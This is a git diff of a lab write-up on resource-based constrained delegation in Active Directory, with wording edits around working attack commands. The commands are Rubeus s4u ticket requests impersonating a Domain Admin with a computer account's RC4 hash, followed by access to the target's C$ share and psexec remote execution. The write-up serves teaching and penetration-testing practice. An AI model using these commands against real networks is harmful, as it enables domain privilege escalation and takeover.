@@ -41,7 +41,7 @@ Get-DomainController
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-20-56-15.png)
 
-Last thing to check - target computer object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:
+Last thing to check - target computer WS01 object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:
 
 ```text
 Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
@@ -53,7 +53,7 @@ This is the attribute the above command is referring to:
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-21-08-47.png)
 
-## Creating a new Computer
+## Creating a new Computer Object
 
 Let's now create a new computer object for our computer `FAKE01` \(as referenced earlier in the requirements table\) - this is the computer that will be trusted by our target computer later on:
 
@@ -139,7 +139,7 @@ Let's generate the RC4 hash of the password we set for the `FAKE01` computer:
 
 ### Impersonation
 
-Once we have the hash, we can now attempt to execute the attack:
+Once we have the hash, we can now attempt to execute the attack by requesting a kerberos ticket for fake01$ with ability to impersonate user spotless who is a Domain Admin:
 
 ```csharp
 \\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
@@ -151,19 +151,19 @@ Unfortunately, in my labs, I was not able to replicate the attack even though ac
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-26-23-40-57%20%281%29.png)
 
-Once again, checking kerberos tickets on the system showed that I had a ticket for spotless who was a DA, but the attack still did not work:
+Once again, checking kerberos tickets on the system showed that I had a ticket for spotless, but the attack still did not work:
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-28-22-01-23.png)
 
-### Endless Erial and Error
+### Endless Trial and Error
 
-After talking to a couple of infosec folks who had successfully simulated this attack in their labs, we still could not figure out what the issue was. After repeating the the attack over and over and carrying out various other troubleshooting steps, I finally found where the issue was.
+Talking to a couple of folks who had successfully simulated this attack in their labs, we still could not figure out what the issue was. After repeating the the attack over and over and carrying out various other troubleshooting steps, I finally found what the issue was.
 
-Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of ws01:
+Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of `ws01`:
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-31-13-16-17.png)
 
-Note, howerver if we request a ticket for SPN `cifs/ws01` \(pink\) - we can now access C$ shares of the ws01 which means we have admin rights on that system:
+Note, howerver if we request a ticket for SPN `cifs/ws01` - we can now access C$ share of the `ws01` which means we have admin rights on the target system WS01:
 
 ```csharp
 \\VBOXSVR\Tools\Rubeus\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt
@@ -171,11 +171,11 @@ Note, howerver if we request a ticket for SPN `cifs/ws01` \(pink\) - we can now 
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-31-13-31-17.png)
 
-To further prove we have admin rights - we write a simple file from ws02 to ws01 in c:\users\administrator:
+To further prove we have admin rights - we can write a simple file from ws02 to ws01 in c:\users\administrator:
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-31-13-36-35.png)
 
-We can further check if we can remotely execute code with our noisy friend psexec:
+Additionally, check if we can remotely execute code with our noisy friend psexec:
 
 ```csharp
 \\vboxsvr\tools\PsExec.exe \\ws01 cmd
